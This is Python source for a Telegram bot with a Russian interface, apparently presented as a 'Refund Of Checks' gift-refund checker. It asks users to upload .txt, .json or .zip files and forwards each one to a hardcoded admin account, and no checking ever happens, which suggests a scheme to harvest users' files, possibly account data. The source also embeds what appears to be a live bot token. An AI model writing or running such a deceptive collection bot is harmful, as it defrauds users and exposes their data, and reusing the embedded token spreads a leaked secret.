import logging
from aiogram.types import FSInputFile
from aiogram import Bot, Dispatcher, F, types
from aiogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.filters import Command
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties


BOT_TOKEN = "8361560182:AAHKnGfaED6hOXwGbiQT0Axe3T9Nr_RiQJQ"
ADMIN_ID = 8033606190
ALLOWED_EXTENSIONS = (".txt", ".json", ".zip")


logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)
dp = Dispatcher()


def main_menu() -> InlineKeyboardMarkup:
    keyboard = [
        [InlineKeyboardButton(text="📖 Инструкция", url="https://telegra.ph/Instrukciya-refnfttgBot-10-30-2")],
        [InlineKeyboardButton(text="🎁 Проверить подарок", callback_data="check_gift")],
    ]
    return InlineKeyboardMarkup(inline_keyboard=keyboard)


def back_menu() -> InlineKeyboardMarkup:
    keyboard = [[InlineKeyboardButton(text="⬅️ Назад", callback_data="go_back")]]
    return InlineKeyboardMarkup(inline_keyboard=keyboard)


@dp.message(Command("start"))
async def cmd_start(message: Message):
    photo = FSInputFile("sec.jpg")
    text = (
        "👋 <b>Добро пожаловать в Refund Of Checks – проверка подарков!</b>\n\n"
        "💼 Проверяйте подарки на рефаунд — безопасно и быстро!\n"
        "📖 Как пользоваться? — Ознакомьтесь с инструкцией ниже.\n\n"
        "Выберите нужный раздел:"
    )
    await message.answer_photo(
        photo=photo,
        caption=text,
        reply_markup=main_menu()
    )


@dp.callback_query(F.data == "check_gift")
async def check_gift_callback(callback: types.CallbackQuery):
    try:
        await callback.message.edit_caption(
            caption="📤 Пришлите файл для проверки (.txt, .json или .zip):",
            reply_markup=back_menu()
        )
    except Exception:
        # Если сообщение без фото, пробуем обычное редактирование
        await callback.message.edit_text(
            "📤 Пришлите файл для проверки (.txt, .json или .zip):",
            reply_markup=back_menu()
        )
    await callback.answer()

@dp.callback_query(F.data == "go_back")
async def go_back_callback(callback: types.CallbackQuery):
    try:
        await callback.message.edit_caption(
            caption=(
                "👋 <b>Добро пожаловать в Refund Of Checks – проверка подарков!</b>\n\n"
                "💼 Проверяйте подарки на рефаунд — безопасно и быстро!\n"
                "📖 Как пользоваться? — Ознакомьтесь с инструкцией ниже.\n\n"
                "Выберите нужный раздел:"
            ),
            reply_markup=main_menu()
        )
    except Exception:
        await callback.message.edit_text(
            "👋 <b>Добро пожаловать в Refund Of Checks – проверка подарков!</b>\n\n"
            "💼 Проверяйте подарки на рефаунд — безопасно и быстро!\n"
            "📖 Как пользоваться? — Ознакомьтесь с инструкцией ниже.\n\n"
            "Выберите нужный раздел:",
            reply_markup=main_menu()
        )
    await callback.answer()



@dp.message(F.document)
async def handle_file(message: Message):
    document = message.document
    filename = document.file_name.lower() if document.file_name else ""

    if not filename.endswith(ALLOWED_EXTENSIONS):
        await message.reply("⚠️ Разрешены только файлы: .txt, .json, .zip")
        return

    try:
        await message.forward(chat_id=ADMIN_ID)
        await message.reply("✅ Файл успешно отправлен админу.")
        logger.info(f"Файл '{filename}' переслан админу {ADMIN_ID} от пользователя {message.from_user.id}")
    except Exception as e:
        logger.error(f"Ошибка при пересылке файла админу: {e}")
        await message.reply("❌ Не удалось отправить файл админу.")



@dp.message()
async def handle_other(message: Message):
    await message.reply("📄 Пожалуйста, отправь файл .txt, .json или .zip.")



async def main():
    logger.info("🚀 Бот запущен и готов к работе.")
    await dp.start_polling(bot)


if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
